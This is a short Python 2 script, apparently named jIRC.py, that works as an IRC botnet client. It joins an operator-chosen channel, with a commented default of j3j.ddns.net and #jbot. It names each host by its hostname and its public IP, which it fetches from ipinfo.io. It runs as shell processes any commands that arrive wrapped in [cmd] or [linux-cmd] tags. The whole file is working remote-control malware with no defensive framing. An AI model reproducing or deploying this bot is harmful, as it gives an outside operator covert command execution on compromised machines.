#!/usr/bin/env python
from __future__ import print_function
import socket
# from urllib import urlopen
import subprocess, sys
import argparse

# Console colors
W = '\033[1;0m'   # white 
R = '\033[1;31m'  # red
G = '\033[1;32m'  # green
O = '\033[1;33m'  # orange
B = '\033[1;34m'  # blue
Y = '\033[1;93m'  # yellow
P = '\033[1;35m'  # purple
C = '\033[1;36m'  # cyan
GR = '\033[1;37m'  # gray
colors = [G,B,P,C,O,GR]
def cowsay():
	print ("""{1}
	  -----------------------------
	< You didn't say the {2}MAGIC WORD{1} >
	  ----------------------------- 
	         \   ^__^
	          \  (oo)\_______
	             (__)\       )\/
	             	\||----w |
	                 ||     ||
	""".format(C, G, P))


def main():
	cowsay()
	parser = argparse.ArgumentParser()
	parser.add_argument('-s','--server' , action='store', dest='SERVER', help='Server name')
	parser.add_argument('-p','--port' , action='store', dest='PORT', help='Port (default: 6667)')
	parser.add_argument('-a','--auth' , action='store', dest='AUTH', help='password to authentication (default is blank)')
	parser.add_argument('-n','--nick' , action='store', dest='NICK', help='Nick name')
	parser.add_argument('-c','--channel' , action='store', dest='CHANNEL', help='Name of channel')
	parser.add_argument('-v','--verbose' , action='store', dest='VERBOSE', help='verbose execute')
	results = parser.parse_args()
	if len(sys.argv) == 1:
		print("""{}
Example: 
	$python jIRC.py -s irc.example.com -c whatever
	$python jIRC.py -s irc.example.com -n j3ssie -c whatever
	$python jIRC.py -s irc.example.com -n j3ssie -c whatever --verbose y
""".format(G))
		exit(0)


	if str(results.PORT) == 'None':
		port = 6667
	else:
		port = int(results.PORT)
		

	if str(results.NICK) == 'None':
		import urllib
		real_ip = urllib.urlopen('http://ipinfo.io/ip').read().strip()
		hostname = socket.gethostname()
		nick = hostname + '-' + real_ip.replace('.','-')
	else:
		nick = str(results.NICK)

	network = str(results.SERVER)
	password = str(results.AUTH)
	channel = '#' + str(results.CHANNEL)
	

	# network = 'j3j.ddns.net'
	# port = 6667
	# channel = '#jbot'
	# nick = 'whaeverman'


	print("{4}[*] Connecting to {5}{0}{4}:{5}{1}{4}, nick: {5}{2}{4}, channel: {5}{3}{4} ".format(network, str(port), nick, channel, G, B))



	irc = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
	irc.connect ( ( network, port ) )
	print(irc.recv ( 4096 ))
	irc.send ( 'NICK {0}\r\n'.format(nick) )
	irc.send ( 'USER {0} {0} {0} :Python IRC\r\n'.format(nick) )
	irc.send ( 'JOIN {0}\r\n'.format(channel) )

	# irc.send ( 'PRIVMSG {0} :Hello World.\r\n' )
	while True:
		data = irc.recv ( 4096 )
		irc.send ( 'JOIN {0}\r\n'.format(channel) )
		# irc.send ( 'PRIVMSG {0} :Hello World.\r\n'.format(channel) )
		if str(results.VERBOSE) != 'None':
			print(data)
		command(data)


def command(data):
	list_data = data.split('\r\n')
	for item in list_data:
		if 'linux-cmd' in item:
			start = item.find('[linux-cmd]')  + len('[linux-cmd]')
			end = item.find('[#end-linux-cmd]')
			cmd = item[start:end].strip()
			print("{1}[*] Execute initial command: {0}{2}".format(cmd,C,GR))
			try:
				process = subprocess.Popen(cmd.split(' '), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
				stdout, stderr = process.communicate()
				if stdout == '':
					print(stderr)
				else:
					print(stdout)
			except:
				pass


		if '[cmd]' in item:
			start = item.find('[cmd]') + len('[cmd]')
			end = item.find('[#end-cmd]')
			cmd = item[start:end].strip()
			print("{1}[*] Execute command: {0}{2}".format(cmd,G,GR))
			process = subprocess.Popen(cmd.split(' '), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			stdout, stderr = process.communicate()
			try:
				process = subprocess.Popen(cmd.split(' '), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
				stdout, stderr = process.communicate()
				if stdout == '':
					print(stderr)
				else:
					print(stdout)
			except:
				pass

	# print(list_data)



if __name__ == '__main__':
	main()